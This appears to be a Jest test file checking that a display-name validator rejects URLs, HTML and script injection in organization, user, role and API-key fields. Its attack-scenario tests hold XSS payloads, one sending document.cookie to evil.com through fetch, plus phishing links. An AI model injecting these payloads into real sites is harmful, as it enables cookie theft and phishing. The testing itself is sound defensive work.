/*
 * Copyright TemplateOrg.
 * SPDX-License-Identifier: Apache-2.0
 */

import 'reflect-metadata'
import { validate } from 'class-validator'
import { plainToInstance } from 'class-transformer'
import { CreateOrganizationDto } from '../../organization/dto/create-organization.dto'
import { CreateUserDto } from '../../user/dto/create-user.dto'
import { UpdateUserDto } from '../../user/dto/update-user.dto'
import { CreateOrganizationRoleDto } from '../../organization/dto/create-organization-role.dto'
import { UpdateOrganizationRoleDto } from '../../organization/dto/update-organization-role.dto'
import { CreateApiKeyDto } from '../../api-key/dto/create-api-key.dto'
import { OrganizationResourcePermission } from '../../organization/enums/organization-resource-permission.enum'

const URL_INPUT = 'https://evil.com'
const HTML_INPUT = '<script>alert(1)</script>'

function hasIsSafeDisplayStringError(errors: any[]): boolean {
  return errors.some((e) => e.constraints && 'IsSafeDisplayStringConstraint' in e.constraints)
}

describe('DTO @IsSafeDisplayString() integration tests — display name fields only', () => {
  describe('CreateOrganizationDto', () => {
    it('should accept valid name', async () => {
      const dto = plainToInstance(CreateOrganizationDto, {
        name: 'My Organization',
        defaultRegionId: 'us-east-1',
      })
      const errors = await validate(dto)
      expect(errors).toHaveLength(0)
    })

    it('should reject URL in name', async () => {
      const dto = plainToInstance(CreateOrganizationDto, {
        name: URL_INPUT,
        defaultRegionId: 'us',
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })

    it('should reject HTML in name', async () => {
      const dto = plainToInstance(CreateOrganizationDto, {
        name: HTML_INPUT,
        defaultRegionId: 'us',
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })

    it('should accept unicode name', async () => {
      const dto = plainToInstance(CreateOrganizationDto, {
        name: '\u00DCnternehmen GmbH',
        defaultRegionId: 'eu',
      })
      const errors = await validate(dto)
      expect(errors).toHaveLength(0)
    })
  })

  describe('CreateUserDto', () => {
    it('should accept valid name', async () => {
      const dto = plainToInstance(CreateUserDto, {
        id: 'user-123',
        name: "John O'Brien",
        email: 'john@example.com',
      })
      const errors = await validate(dto)
      expect(errors).toHaveLength(0)
    })

    it('should reject URL in name', async () => {
      const dto = plainToInstance(CreateUserDto, {
        id: 'user-123',
        name: URL_INPUT,
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })
  })

  describe('UpdateUserDto', () => {
    it('should accept valid name', async () => {
      const dto = plainToInstance(UpdateUserDto, {
        name: 'Jane Smith',
        email: 'jane@example.com',
      })
      const errors = await validate(dto)
      expect(errors).toHaveLength(0)
    })

    it('should reject URL in name', async () => {
      const dto = plainToInstance(UpdateUserDto, { name: URL_INPUT })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })
  })

  describe('CreateOrganizationRoleDto', () => {
    it('should accept valid name and description', async () => {
      const dto = plainToInstance(CreateOrganizationRoleDto, {
        name: 'Maintainer',
        description: 'Can manage all resources',
        permissions: [OrganizationResourcePermission.WRITE_SANDBOXES],
      })
      const errors = await validate(dto)
      expect(errors).toHaveLength(0)
    })

    it('should reject URL in name', async () => {
      const dto = plainToInstance(CreateOrganizationRoleDto, {
        name: URL_INPUT,
        description: 'Valid',
        permissions: [OrganizationResourcePermission.WRITE_SANDBOXES],
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })

    it('should reject HTML in description', async () => {
      const dto = plainToInstance(CreateOrganizationRoleDto, {
        name: 'Valid',
        description: HTML_INPUT,
        permissions: [OrganizationResourcePermission.WRITE_SANDBOXES],
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })
  })

  describe('UpdateOrganizationRoleDto', () => {
    it('should reject URL in name', async () => {
      const dto = plainToInstance(UpdateOrganizationRoleDto, {
        name: URL_INPUT,
        description: 'Valid',
        permissions: [OrganizationResourcePermission.WRITE_SANDBOXES],
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })
  })

  describe('CreateApiKeyDto', () => {
    it('should accept valid name', async () => {
      const dto = plainToInstance(CreateApiKeyDto, {
        name: 'My API Key',
        permissions: [OrganizationResourcePermission.WRITE_SANDBOXES],
      })
      const errors = await validate(dto)
      expect(errors).toHaveLength(0)
    })

    it('should reject URL in name', async () => {
      const dto = plainToInstance(CreateApiKeyDto, {
        name: URL_INPUT,
        permissions: [OrganizationResourcePermission.WRITE_SANDBOXES],
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })
  })

  describe('real-world attack scenarios', () => {
    it('should reject org name that causes email auto-linking', async () => {
      const dto = plainToInstance(CreateOrganizationDto, {
        name: 'https://evil.com',
        defaultRegionId: 'us',
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })

    it('should reject org name with embedded phishing URL', async () => {
      const dto = plainToInstance(CreateOrganizationDto, {
        name: 'Legit Corp https://steal-creds.com',
        defaultRegionId: 'us',
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })

    it('should reject user name with XSS payload', async () => {
      const dto = plainToInstance(CreateUserDto, {
        id: 'user-123',
        name: '<img src=x onerror=alert(document.cookie)>',
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })

    it('should reject API key name with script injection', async () => {
      const dto = plainToInstance(CreateApiKeyDto, {
        name: '"><script>fetch("https://evil.com/steal?c="+document.cookie)</script>',
        permissions: [OrganizationResourcePermission.WRITE_SANDBOXES],
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })

    it('should reject role description with HTML injection', async () => {
      const dto = plainToInstance(CreateOrganizationRoleDto, {
        name: 'Admin',
        description: 'Full access <a href="https://phish.com">click here</a>',
        permissions: [OrganizationResourcePermission.WRITE_SANDBOXES],
      })
      const errors = await validate(dto)
      expect(hasIsSafeDisplayStringError(errors)).toBe(true)
    })
  })

  describe('legitimate display names that should NOT break', () => {
    it('should accept names with special characters', async () => {
      const testCases = [
        'Daytona Platforms Inc.',
        "O'Reilly Media",
        'Smith & Associates',
        'Dept. of Engineering',
        'team-alpha_v2',
        'My Org (Test)',
        '#1 Company',
        '50% Off Corp',
      ]

      for (const name of testCases) {
        const dto = plainToInstance(CreateOrganizationDto, { name, defaultRegionId: 'us' })
        const errors = await validate(dto)
        expect(errors).toHaveLength(0)
      }
    })
  })
})
